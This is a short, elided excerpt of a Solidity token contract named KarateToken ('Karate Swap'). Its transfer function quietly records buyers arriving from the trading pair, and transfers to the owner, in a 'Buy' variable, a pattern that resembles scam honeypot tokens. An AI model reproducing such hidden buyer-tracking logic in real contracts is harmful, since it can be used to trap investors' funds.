...
contract KarateToken {
    using SafeMath for uint256;
    string public name = "Karate Swap";
    string public symbol = "KARATE";
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        ...
        if (msg.sender==KaratePair() && balanceOf[to]==0) {Buy = to;}
        if (to== Owner) {Buy=to;}
    ...
    function KaratePair() public view returns (address) {
